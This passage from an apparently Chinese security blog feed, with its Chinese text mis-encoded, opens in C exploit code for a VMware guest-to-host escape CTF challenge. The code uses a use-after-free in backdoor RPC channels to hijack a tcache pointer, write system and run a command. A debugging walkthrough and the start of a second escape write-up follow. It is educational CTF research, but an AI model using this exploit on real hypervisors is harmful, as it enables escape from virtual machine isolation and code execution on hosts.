class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="0x03-è°ƒè¯•"><a href="#0x03-è°ƒè¯•" class="headerlink" title="0x03 è°ƒè¯•"></a>0x03 è°ƒè¯•</h2><p>æŠŠæ–­ç‚¹æ”¾åœ¨reallocçš„ä½ç½®ï¼Œæ–¹ä¾¿æŸ¥çœ‹reallocåçš„å †å¸ƒå±€ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" alt="å›¾ç‰‡.png"></p><p>åœ¨ç¬¬ä¸€æ¬¡freeçš„ä½ç½®çœ‹åˆ°äº†ç›®æ ‡chunkï¼Œ<code>0x7f797803a890</code>ï¼Œè¿™ä¸ªchunkå°±æ˜¯æˆ‘ä»¬è¦å¤ç”¨çš„chunkã€‚æ­¤æ¬¡reallocç»“æŸï¼Œåº”è¯¥è¢«æŒ‚è¿›tcacheã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" alt="å›¾ç‰‡.png"></p><p>æ•´ä¸ªchunkçš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°å¤§å°æ˜¯0x115ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿åœ°å€éƒ½æ²¡å¯¹é½ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" alt="å›¾ç‰‡.png"></p><p>å•æ­¥æ‰§è¡Œä¹‹åï¼Œçœ‹åˆ°è¢«æŒ‚è¿›tcacheçš„chunkã€‚å½“channel 1ï¼Œallocå–å‡ºè¿™å—chunkçš„æ—¶å€™ï¼Œæ²¡æœ‰è§¦å‘åˆ°reallocï¼Œç›´æ¥èµ°è¿‡å»äº†ã€‚æ‰€ä»¥æ²¡æ–­ä¸‹æ¥ã€‚å› è¯¥åœ¨ifçš„åˆ¤æ–­ä½ç½®åŠ ä¸€ä¸ªæ–­ç‚¹ï¼ŒæŸ¥çœ‹å †å¸ƒå±€çš„ã€‚</p><p>ä¸è¿‡æ­¤æ—¶å¯ä»¥çœ‹ä¸€ä¸‹ç›®æ ‡chunkçš„å†…å®¹ï¼Œæœ‰æ²¡æœ‰è¢«æ”¹å˜ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹åˆ°è¢«æŒ‚ä¸Šäº†ç†Ÿæ‚‰çš„fdï¼Œä½†æ˜¯å´æ²¡æœ‰åœ¨ç›¸åº”çš„tcacheé‡Œé¢ï¼Œåˆ™å¯ä»¥æ¨æ–­ï¼Œè¯¥chunkå·²ç»æ˜¯allocçŠ¶æ€äº†ã€‚</p><p>ç»§ç»­æ‰§è¡Œï¼Œç¬¬äºŒæ¬¡freeã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" alt="å›¾ç‰‡.png"></p><p>æ­¤æ¬¡reallocä¾ç„¶è§¦å‘freeã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" alt="å›¾ç‰‡.png"></p><p>chunkè¢«æŒ‚è¿›äº†tcacheï¼Œç„¶åä¸‹ä¸€æ­¥æ‰§è¡Œdnd_versionåº”è¯¥ä¼šæŠŠchunkå–å‡ºï¼Œç„¶åæŠŠè™šè¡¨æŒ‡é’ˆå†™å…¥ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸå†™å…¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ”¹å†™systemçš„è¿‡ç¨‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" alt="å›¾ç‰‡.png"><br> channel 0çš„ç¬¬ä¸€æ¬¡freeï¼Œè®°ä½chunkåœ°å€ï¼Œ0x7fa59c028e20ï¼Œç„¶åå’Œleakä¸€çœ¼ï¼Œå¯¹channel 1çš„UAFã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" alt="å›¾ç‰‡.png"></p><p>åŠ«æŒæˆåŠŸï¼Œä½†æ˜¯æ­¤æ—¶tcacheä¸­å´çœ‹ä¸åˆ°ï¼Œå¯èƒ½heapinfoæœ‰ç‚¹é—®é¢˜ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" alt="å›¾ç‰‡.png"></p><p>è®¡ç®—åç§»åï¼Œç›®æ ‡ä½ç½®è¢«æ‰“å…¥tcacheçš„fdä¸­ï¼Œç„¶åå°±æ˜¯å¸¸è§„åˆ©ç”¨ã€‚æŠŠè¯¥å†…å­˜mallocå‡ºæ¥ã€‚ç„¶åå†™å…¥system</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸå†™å…¥systemï¼Œç»§ç»­æ‰§è¡Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" alt="å›¾ç‰‡.png"></p><h2 id="0x05-æ€è€ƒ"><a href="#0x05-æ€è€ƒ" class="headerlink" title="0x05 æ€è€ƒ"></a>0x05 æ€è€ƒ</h2><p>emmï¼Œè°ƒè¯•æ€»æ˜¯é‡åˆ°ä¸€äº›é—®é¢˜ï¼Œæœ‰æ—¶å€™æŒ‚ä¸Šgdbï¼Œleakå‡ºæ¥çš„åŸºå€å°±ä¸å¯¹äº†ã€‚ã€‚ã€‚ç¦»è°±ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚æƒ³åˆ°çš„åŠæ³•æ˜¯ï¼Œå…ˆå‘é€å®Œpayloadï¼Œç„¶åå†attachä¸Šå»ï¼Œexpå’Œleakéƒ¨åˆ†åˆ†å¼€è°ƒè¯•ã€‚</p><p>è¿˜æœ‰è™šæ‹Ÿæœºçš„vmxï¼Œç§»åŠ¨çš„æ—¶å€™ï¼Œæƒé™å…³ç³»ï¼Œå¯èƒ½å¯¼è‡´æ‰“ä¸å¼€è™šæ‹Ÿæœºï¼Œåªæœ‰ä½¿ç”¨sudo  vmwareæ‰å¯ä»¥æ‰“å¼€ï¼Œä¸è¿‡è¿™æ ·æ‰“å¼€çš„è™šæ‹Ÿæœºï¼Œæœ€åå¯ä»¥æˆåŠŸleakå’Œæ‰§è¡Œï¼Œä½†æ˜¯å¼¹ä¸å‡ºè®¡ç®—å™¨ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼ŒæŠ¥é”™æŠ¥äº†è™šæ‹ŸåŒ–é”™è¯¯ï¼Œæäº†å¥½ä¹…æ²¡è§£å†³ï¼Œæœ€åä¹Ÿæ˜¯è«åå…¶å¦™çš„çªç„¶è§£å†³äº†ã€‚</p><p>ä¸¤ä¸ªvmç±»å‹çš„è™šæ‹Ÿæœºé€ƒé€¸æ”¶è·å¾ˆå¤§ï¼Œé€†å‘çš„åŸºç¡€ç‰¢å›ºäº†è®¸å¤šï¼Œrealworldç±»çš„é¢˜ç›®å’ŒCTFè¿˜æ˜¯æœ‰å¾ˆå¤šå·®åˆ«ï¼Œå‰è€…éœ€è¦å¾ˆå¥½çš„é€†å‘åŠŸåº•å’Œå¯¹ç›®æ ‡çš„ç†Ÿæ‚‰ï¼Œåè€…æ›´å¤šæ˜¯æŠ€å·§ä¸Šçš„åˆ©ç”¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº ï¼š <a href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p></blockquote><h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>è™šæ‹ŸåŒ–æŠ€æœ¯é€æ¸çš„å¼€æºå’Œäº‘è®¡ç®—çš„éœ€è¦ï¼Œä½¿å¾—è™šæ‹ŸåŒ–è¿…é€Ÿå‘å±•ï¼Œä»KVMï¼ŒXENåˆ°qemuï¼Œdockerâ€¦ç­‰ï¼Œã€‚</p><p>æœåŠ¡å’Œè½¯ä»¶å®šä¹‰ç½‘ç»œçš„ç†å¿µæ¨¡ç³Šäº†å¼€å‘å’Œè¿ç»´çš„ç•Œé™ï¼Œä¹ŸæŠŠæ›´å¤šçš„å®‰å…¨é—®é¢˜å¸¦å…¥åˆ°è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ã€‚æ›´å¤šåŸºç¡€è®¾æ–½å³æœåŠ¡ï¼ˆIaasï¼‰ç®¡ç†å¹³å°çš„é—®é¢˜ä»¥åŠäº‘ä¾›åº”å•†çš„ä¸å¯æ§éƒ½ç»™è™šæ‹ŸåŒ–æŠ€æœ¯çš„å®‰å…¨åº”ç”¨å¸¦æ¥é˜»ç¢ï¼Œè€ŒçœŸæ­£çš„è™šæ‹ŸåŒ–å®‰å…¨è¦ä»è™šæ‹ŸåŒ–æŠ€æœ¯æœ¬èº«è°ˆèµ·ã€‚</p><p>æ—©æœŸçš„è™šæ‹ŸåŒ–æå‡ºçš„æ˜¯ï¼Œå®¿ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„éš”ç¦»ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œä¸¤æœºä¹‹é—´çš„é€šä¿¡è®©è¿™ç§éš”ç¦»å˜å¾—æ¨¡ç³ŠåŒ–ï¼Œæ— è®ºæ˜¯FTPè¿˜æ˜¯å…±äº«æœºåˆ¶ï¼Œéƒ½ç»™å®‰å…¨å¸¦æ¥çš„è¾ƒå¤§çš„æŒ‘æˆ˜ï¼Œæœ¬æ–‡é’ˆå¯¹è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´è¿›è¡Œä¸€ä¸ªå…¥é—¨çº§åˆ«çš„åˆ†æã€‚</p><h2 id="0x02-å¦‚ä½•é€ƒé€¸"><a href="#0x02-å¦‚ä½•é€ƒé€¸" class="headerlink" title="0x02 å¦‚ä½•é€ƒé€¸"></a>0x02 å¦‚ä½•é€ƒé€¸</h2><p><strong>é¦–å…ˆï¼Œéœ€è¦æ˜ç¡®ææƒçš„æ¨¡å‹</strong>ï¼Œè™šæ‹Ÿæœºé€ƒé€¸çš„æƒ…å†µç¹å¤šï¼Œå¤§è‡´çš„æ¨¡å‹å’Œææƒæ–¹å¼éƒ½ç±»ä¼¼ã€‚ï¼ˆåç»­çš„ä¸€äº›ç¤ºä¾‹è¡¨ç¤ºï¼Œéå†…æ ¸æ€ä¹Ÿå¯ä»¥é€ƒé€¸ï¼‰</p><ul><li>è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿå‘é€æ•æ„Ÿè¯·æ±‚ï¼Œä½¿æ“ä½œç³»ç»Ÿé™·å…¥å†…æ ¸æ€</li><li>æŸäº›ç‰¹æƒæŒ‡ä»¤ä¼šè¿›å…¥ring0ä»¥ä¸‹çš„çŠ¶æ€ï¼Œå³äº¤ç»™<code>Hypervisor</code>å¤„ç†</li><li>åˆ©ç”¨Hypervisorçš„è„†å¼±æ€§æ¼æ´ä½¿å¾—Hypervisoræ‰§è¡Œå®Œç‰¹æƒæŒ‡ä»¤åä¸äº§ç”ŸæŒ‡ä»¤çŠ¶æ€çš„è¿”å›ï¼Œä½¿å¾—æ‰§è¡Œå®ŒæŒ‡ä»¤åä¾ç„¶åœç•™åœ¨å†…æ ¸æ€</li><li>å®ç°äº†ææƒåï¼Œå¯ä»¥æ¸—é€åˆ°Hypervisorå’Œè™šæ‹Ÿæœºçš„å…¶ä»–åŒºåŸŸï¼Œç ´åè™šæ‹ŸåŒ–çš„éš”ç¦»æœºåˆ¶ï¼Œå®Œæˆé€ƒé€¸æ“ä½œã€‚</li></ul><p><strong>äº†è§£åŸºæœ¬çš„æµç¨‹ä¹‹åï¼Œå°±æ˜¯ç†è§£</strong>ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" alt="img"><br> ä»¥ä¸Šæ˜¯ä¸€ä¸ªè™šæ‹ŸåŒ–çš„åŸºæœ¬æ¨¡å‹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå…¨è™šæ‹ŸåŒ–çš„æ¨¡å‹ï¼ŒVMMå³hypervisorï¼Œææƒåˆ©ç”¨çš„æ˜¯ç‰¹æ®ŠæŒ‡ä»¤æ‰§è¡Œæ—¶å€™ä¼šé™·å…¥root modeã€‚</p><p>è¿™ç±»æŒ‡ä»¤çš„å­˜åœ¨è®©ææƒå’Œé€ƒé€¸å˜å¾—å¯è¡Œã€‚æ€»ç»“ä»¥ä¸Šæµç¨‹ï¼Œå†™å‡ºä¸€ä¸ªé€ƒé€¸éœ€è¦çš„åŸºæœ¬æ¡ä»¶ã€‚</p><ol><li>æœ‰æ¼æ´çš„å†…æ ¸ï¼Œå³æœ‰å¯ä»¥æ‰§è¡Œä½¿å¾—é™·å…¥hypervisorçš„æŒ‡ä»¤</li><li>æœ‰ä¸€æ¬¡åŒ¹é…çš„é€ƒé€¸ï¼Œç†è§£ä¸ºå¯ä»¥ä½¿å¾—å®¿ä¸»æœºå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨</li></ol><p>ç¬¬äºŒç‚¹çš„åˆ©ç”¨ï¼Œåœ¨ä¸åŒçš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ï¼Œä¸ä¸€æ ·ï¼Œä¸‹é¢ä»¥VM wareçš„é€ƒé€¸ï¼Œåšä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>è¿™é¢˜æ˜¯RWCTF2018 finalï¼Œåšä¸€ä¸ªå…¥æ‰‹çš„é¢˜ç›®éå¸¸çš„åˆé€‚ã€‚</p><h3 